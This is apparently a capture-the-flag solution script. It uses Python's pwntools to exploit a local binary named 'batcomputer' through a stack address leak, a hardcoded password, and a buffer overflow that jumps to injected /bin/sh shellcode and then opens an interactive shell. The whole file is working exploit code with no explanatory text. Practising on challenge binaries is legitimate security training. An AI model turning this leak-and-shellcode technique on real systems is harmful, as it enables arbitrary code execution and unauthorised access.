from pwn import *

def main ():
	io = process('./batcomputer')

# Enable verbose logging so we can see exactly what is being sent (info/debug)
	
	context.log_level = 'debug'

	context(os='linux', arch= 'amd64')

	#Enumerating the binary
	password = 'b4tp@$$w0rd!'
	return_address_offset = 84
	max_payload_length = 137

	#Leaking the stack address
	io.sendlineafter('> ', '1')
	stack_address = io.recvline().strip().split()[-1]

	#turn into Hex and join
	stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len (stack_address),2)]) 
	
	#make sure the length is 8 bytes
	stack_address = stack_address.rjust(8, '\x00')
	#unpacks string into integer
	stack_address = u64(stack_address)
	log.success(f'Leaked stack address: {p64(stack_address)}')


	print(stack_address)
	

	#Buffer overflow
	io.sendlineafter('> ', '2')
	io.sendlineafter('password: ', password)
	padding = b'a' * (return_address_offset)
	shell_code = asm(shellcraft.sh())
	payload = padding + p64(stack_address + return_address_offset + 8) + shell_code
	assert len(payload) <= max_payload_length, f'Payload "{len(payload)}" too long. Allowed: {max_payload_length}'
	io.sendlineafter('commands: ', payload)
	io.sendlineafter('> ', '3')

	io.interactive()











if __name__=='__main__':
	main()

